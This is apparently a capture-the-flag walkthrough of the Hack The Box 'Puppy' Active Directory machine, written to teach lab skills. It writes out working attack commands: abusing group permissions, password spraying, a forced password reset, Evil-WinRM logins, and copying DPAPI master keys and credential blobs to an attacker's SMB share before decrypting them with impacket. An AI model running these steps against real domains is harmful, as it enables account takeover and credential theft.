---
layout: post
title: "Puppy: Hack The Box Season 8 "
date: 2025-05-24
image: /assets/puppy.png
categories: 
  - HackTheBox
  - Windows
  - Active Directory
tags:
  - Windows
  - Active Directory
  - BloodHound
  - SMB
  - DPAPI
  - KeePass
  - Privilege Escalation
  - HTB Season 8
description: "A comprehensive walkthrough of the HackTheBox Season 8 Puppy machine, exploring advanced Active Directory exploitation techniques, group permission abuse, and DPAPI credential extraction. Master the art of BloodHound enumeration and discover multiple privilege escalation paths in this Windows-based challenge."
active: true
toc: true
comments: true
---

# HackTheBox - Puppy Writeup

## Introduction
Greetings! In this writeup, we'll be pwning Puppy, a Windows machine from HackTheBox Season 8 focused on Active Directory exploitation. This box provides an excellent opportunity to master AD enumeration and privilege escalation techniques. Let's begin our journey into the depths of this machine and uncover its secrets!

## Box Details
```bash
Name:        Puppy
Category:    Active Directory
Difficulty:  Medium
Points:      30
Release:     March 8, 2025
OS:          Windows
IP:          10.10.11.70
```
![Puppy Machine Info](/assets/nmapscan.png)

## Tools We'll Need
- [Nmap](https://nmap.org/) - For initial port scanning
- [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) - For SMB enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) + [Neo4j](https://neo4j.com/) - For AD enumeration
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) - For remote access
- [Impacket](https://github.com/SecureAuthCorp/impacket) - For various AD attacks
- [KeePass](https://keepass.info/) - For password database analysis
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (alternative) - For credential extraction

## Initial Reconnaissance

### Port Scan
Let's start with a good old Nmap scan to see what we're working with:

```bash
nmap -sC -sV 10.10.11.70
```

![Nmap Scan Results](/assets/nmapscan.png)

The scan reveals several open ports, with SMB (445) being particularly interesting. This is often a good entry point for Windows machines. The presence of SMB suggests we're dealing with a Windows machine, and it's often a good starting point for enumeration.

### SMB Enumeration
We're given credentials for `levi.james`, so let's see what shares we can access:

```bash
smbclient -L //10.10.11.70 -U levi.james --password=KingofAkron2025!
```

![SMB Shares List](/assets/smbclient.png)

We see several shares, including a `DEV` folder that gives us an "Access Denied" error. This is a clear sign we need to find a way to elevate our privileges.

![Access Denied Error](/assets/accessdenied.png)

## Active Directory Enumeration

### BloodHound Setup
For this I had to install BloodHound on my machine by pulling the docker image and running it:

```bash
docker run -d --name bloodhound neo4j
```

Time to fire up BloodHound! This tool is absolutely crucial for understanding the AD environment. Here's what we find:

![BloodHound Overview](/assets/bloodhound1.png)

Download the file on BloodHound and save upload it to the BloodHound instance.
Navigate to blood hound on your browser and login with the credentials `neo4j/neo4j`. Then click on the "Upload" button and select the file you downloaded.

![BloodHound Overview](/assets/bloodhound2.png)

After upload you'll see ready on bloodhound then click close.

![BloodHound Ready](/assets/bloodhound3.png)

### BloodHound Analysis
Our analysis reveals several interesting relationships:

- `levi.james` is part of the HR group
![BloodHound Groups](/assets/bloodhound6.png)

- HR group has GenericWrite permissions to the Developers group
![BloodHound Groups](/assets/bloodhound7.png)

- `adam.silver` has remote access permissions
![BloodHound Groups](/assets/bloodhound8.png)

- `steph.cooper` has administrative access
- `ant.edwards` has GenericAll permissions over `adam.silver`
![BloodHound Groups](/assets/bloodhound10.png)

### 🔄 Alternative Paths
> **Note:** While we used BloodHound, here are some alternative approaches you could try:
> 1. Using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) for AD enumeration
> 2. Using [ldapsearch](https://linux.die.net/man/1/ldapsearch) for direct LDAP queries
> 3. Using [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) for RPC enumeration
> 4. Using [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) for GUI-based enumeration

### Privilege Escalation Path
Let's abuse that GenericWrite permission to add `levi.james` to the Developers group:

```bash
net rpc group addmem "Developers" "levi.james" -U "puppy.htb/levi.james%KingofAkron2025!" -S "dc.puppy.htb"
```

![GenericWrite Permission](/assets/dev.png)

Pro tip: Make sure you've added the domain to your /etc/hosts file!

Now we can access the DEV share and find:
- KeePassXC installer
- `recovery.kdbx` database file
- `payload2.exe`
- Empty Projects folder

![DEV Share Contents](/assets/downloadrecoverykdbx.webp)

## KeePass Database Exploitation

The `recovery.kdbx` file is password protected. After some brute-forcing, we discover the password is "liverpool". Inside, we find a goldmine of user credentials!

![KeePass Database](/assets/liverpool.png)

Then open the database using keepassxc:

![KeePass Database](/assets/keepassgui.png)

### 🔄 Alternative Tools for KeePass Exploitation
> **Note:** Instead of using KeePass GUI, you could try:
> - `keepass2john + john` - For password cracking
> - `keepass-dump` - For direct database extraction
> - `keepass-password-dumper` - For automated extraction
> - [KeePassXC CLI](https://keepassxc.org/docs/KeePassXC_UserGuide.html#_command_line_interface) - For command-line operations

## BloodHound Analysis
With those users in mind, we go back to BloodHound and find that user `adam.silver` has remote access allowed for him:

![BloodHound Groups](/assets/adminsilverremote.png)

## Password Spray Attack

Using the credentials from KeePass, we perform a password spray attack. We discover that `ant.edwards` has valid credentials. Through BloodHound, we find that `ant.edwards` has GenericAll permissions over `adam.silver`. This is after saving names as users.txt and passwords as passwords.txt.

![Password Spray Results](/assets/passwordspray.png)

### 🔄 Tools for Password Spraying
> **Note:** Alternative tools you could use:
> - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - For automated spraying
> - [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) - For targeted spraying
> - [Metasploit's smb_login module](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login) - For automated testing
> - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) - For domain-wide spraying

## BloodHound Analysis
Going back to BloodHound, I found out the relationship between levi.james and ant.edwards. They don't have remote access, but adam.silver has remote access allowed for him:

![BloodHound Groups](/assets/bloodpass.png)

## Privilege Escalation

1. Using `ant.edwards`'s GenericAll permissions, we change `adam.silver`'s password:
```bash
net rpc password 'adam.silver' 'Newpass123' -U 'puppy.htb/ant.edwards%Antman2025!' -S 'dc.puppy.htb'
```

2. Enable the disabled `adam.silver` account:
```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p Antman2025! remove uac adam.silver -f ACCOUNTDISABLE
```

![Account Status](/assets/disabledsilver.png)

3. Access the system using Evil-WinRM:
```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p Newpass123
```

![Initial Access](/assets/enabledevilwinrmflag.png)

After that, we find the flag in the desktop folder of adam silver by navigating into the directory and typing `type users.txt` to find the flag, and that's the user flag pwned.

## 🎯 User Flag Pwned! 🎯
```
type C:\Users\adam.silver\Desktop\user.txt
```

![User Flag](/assets/enabledevilwinrmflag.png)

## Root Access

### Initial Access as steph.cooper
1. Download and analyze the backup file containing `XML.BAK`
![Root Access](/assets/enabledevilwinrmflag.png)

Unzipping the file, we find there's an XML.BAK file and inside it, I found the password for steph.cooper.

2. Discover `steph.cooper`'s credentials
![Root Access](/assets/stephpass.png)

### BloodHound Analysis
When we go back to BloodHound, we find that steph.cooper has remote access permission and there's also another similar user steph.cooper_adm:

![Root Access](/assets/stephbloodhound.png)

Let's now login as steph.cooper:

3. Access the system as `steph.cooper`:
```bash
evil-winrm -i 10.10.11.70 -u steph.cooper -p JustAnotherMonday2025!
```

Inside we find the DPAPI encryption creds:
![Root Access](/assets/dpapicreds.png)

Then we also have the master key file:
![Backup File](/assets/masterkeyfile.png)

### DPAPI Credential Extraction
1. Set up an SMB share on our attack machine:
```bash
mkdir share
impacket-smbserver share ./share -smb2support
```

![Smb Access](/assets/createsmb.png)

Then now copy the DPAPI keys to our new share:
![Smb Access](/assets/smbsharecopy.png)

2. Copy the DPAPI master key and credential blob:
```bash
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\556a2412-1275-4ccf-b721-e6a0b4f90407" "\\<Your-IP>\share\masterkey_blob"
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "\\<Your-IP>\share\credential_blob"
```

![File Copy](/assets/copyfiles.png)

Now the files have been copied successfully:
![File copy Success](/assets/coppiedsuccess.png)

3. Decrypt the master key:
```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -f masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

![Master Key Decryption](/assets/decryptmasterkey.png)

4. Decrypt the credential blob:
```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -k <MasterKey> -f credential_blob
```

![Credential Decryption](/assets/decryptmasterkey.png)

### 🔄 Alternative Tools for DPAPI Exploitation
> **Note:** Instead of using Impacket's DPAPI tools, you could try:
> - [Mimikatz](https://github.com/gentilkiwi/mimikatz) - For direct credential extraction
> - [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) - For .NET-based extraction
> - [DPAPIck](https://github.com/jordanbtucker/dpapick) - For Python-based extraction
> - [LaZagne](https://github.com/AlessandroZ/LaZagne) - For automated extraction

### Final Privilege Escalation
1. Use the administrative credentials that we found after decrypting the keys:
```bash
evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!
```

2. Navigate to the administrator's desktop to find the root flag.

## 🏆 Root Flag Pwned! 🏆
```
type C:\Users\steph.cooper_adm\Desktop\root.txt
```

![Root Flag](/assets/rootflag.png)

## 🔄 Alternative Paths to Root
> **Note:** Here are some other ways you could have rooted this machine:
> 1. Using [Mimikatz](https://github.com/gentilkiwi/mimikatz) for credential extraction
> 2. Exploiting the payload2.exe file (if it's vulnerable)
> 3. Using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) for more detailed AD enumeration
> 4. Attempting to exploit the KeePassXC installer
> 5. Using [Rubeus](https://github.com/GhostPack/Rubeus) for Kerberos attacks
> 6. Using [Certify](https://github.com/GhostPack/Certify) for certificate-based attacks

## Conclusion
This machine teaches us several important lessons:
- The power of BloodHound in AD enumeration
- How to abuse group permissions for privilege escalation
- The importance of proper credential management
- Different methods of credential extraction (DPAPI, Mimikatz)
- The value of having multiple tools in your arsenal

Remember, in real-world scenarios, you might need to try different approaches as some might be blocked or detected. Always have a backup plan!

## Useful Resources
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Impacket Examples](https://github.com/SecureAuthCorp/impacket/tree/master/examples)
- [DPAPI Internals](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28)
- [Active Directory Security](https://adsecurity.org/)
- [HackTricks AD Section](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PowerView Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [AD Security Blog](https://adsecurity.org/)
- [SMB Security Guide](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
